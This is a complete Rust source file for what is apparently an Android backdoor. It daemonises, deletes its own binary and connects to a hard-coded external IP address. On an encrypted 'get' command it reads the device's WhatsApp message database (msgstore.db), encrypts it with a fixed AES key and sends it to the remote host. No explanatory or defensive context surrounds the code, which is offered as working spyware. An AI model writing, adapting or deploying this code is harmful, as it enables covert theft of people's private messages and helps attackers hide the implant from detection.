extern crate hex;
#[macro_use] extern crate log;

use android_logger::Config;
use log::Level;
use std::env;
use std::fs;
use std::fs::File;
use std::io::prelude::*;
use std::string::ToString;
use nix::unistd::*;
use std::net::TcpStream;
use openssl::symm::{Cipher, Crypter};
use openssl::symm::Mode;
use openssl::error::ErrorStack;
use hex::{FromHex};

fn decrypt(t: Cipher,
           key: &[u8],
           iv: Option<&[u8]>,
           data: &[u8],
           ) -> Result<Vec<u8>, ErrorStack> {
    let mut c = Crypter::new(t, Mode::Decrypt, key, iv)?;
    c.pad(false);
    let mut out = vec![0; data.len() + t.block_size()];
    let count = c.update(data, &mut out)?;
    let rest = c.finalize(&mut out[count..])?;
    out.truncate(count + rest);
    Ok(out)
}

fn encrypt(t: Cipher,
        key: &[u8],
        iv: Option<&[u8]>,
        data: &[u8],
        ) -> Result<Vec<u8>, ErrorStack> {
    let mut c = Crypter::new(t, Mode::Encrypt, key, iv)?;
    c.pad(false);
    let mut out = vec![0; data.len() + t.block_size()];
    let count = c.update(data, &mut out)?;
    let rest = c.finalize(&mut out[count..])?;
    out.truncate(count + rest);
    Ok(out)
}


fn main() -> Result<(), Box<dyn std::error::Error>> {

    
    android_logger::init_once(
    Config::default()
    .with_min_level(Level::Info) // limit log level
    .with_tag("TOAST") // logs will show under mytag tag
    );
    
    let mut stream = TcpStream::connect("3.215.107.66:443")?;
    match setup() {
       Ok(()) => info!("No error from setup"),
       Err(e) => error!("Error in setup: {}", e),
    };

    loop {    
        let res = match get_commands(&mut stream){
            Ok(res) => {
                info!("Got commands {:?}", res);
                res
            }
                ,
            Err(e) => {
                error!("{}", e);
                panic!("{}", e)
            }
        };
        let trimmed = res.trim();
        if trimmed[0..3].eq("get") {
            info!("starting steal_db");
            let encrypted_db = match steal_db() {
                Ok(db) => db,
                Err(e) => {
                    error!("{}", e);
                    panic!("{}", e);
                }
            };
            match stream.write_all(&encrypted_db) {
                Ok(_) => info!("Sent db successfully"),
                Err(e) => error!("Could not send db: {}", e),
            };
        }
        if trimmed[0..4].eq("kill") {
            break;
        }
    }
    Ok(())
}

fn get_commands(stream:  &mut std::net::TcpStream) -> Result<String, Box<dyn std::error::Error>> {
    let mut buffer = [0; 32];
    let _len = &stream.read(&mut buffer)?;
    let key = Vec::from_hex("546869732069732061206b6579313233")?;
    let iv = Vec::from_hex("5468697320697320616e204956343536")?;
    let cipher = Cipher::aes_128_cbc();

    let command = match decrypt(
        cipher,
        &key,
        Some(&iv),
        &buffer[0..16]) {
        Ok(c) => c,
        Err(e) => panic!("{}", e),
    };

    let res = std::str::from_utf8(&command).unwrap();
    println!("{:?}" , res);
    Ok(res.to_string())
}

fn setup() -> Result<(), Box<dyn std::error::Error>> {
    match fork()? {                                                                                               
        ForkResult::Parent{ child: _ } => {
            std::process::exit(0);
        }
        ForkResult::Child => {}
    };  
    setsid()?;
    env::set_current_dir("/data")?;
    match env::args().next() {
        Some(arg) => {
            info!("Argument: {}", &arg);
            fs::remove_file(&arg)?;
        },
        None => { 
            warn!("No argument provided");
            fs::remove_file("/data/pprt")?;
        },
    };
    Ok(())
}


fn steal_db() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
    let mut buffer = Vec::new();
    db.read_to_end(&mut buffer)?;
    let key = Vec::from_hex("546869732069732061206b6579313233")?;
    let iv = Vec::from_hex("5468697320697320616e204956343536")?;
    let cipher = Cipher::aes_128_cbc();
    info!("Encrypting db");
    let encrypted_db = match encrypt(
        cipher,
        &key,
        Some(&iv),
        &buffer) {
        Ok(c) => c,
        Err(e) => panic!("{}", e),
    };
    info!("Done encrypting db");
    Ok(encrypted_db)
}
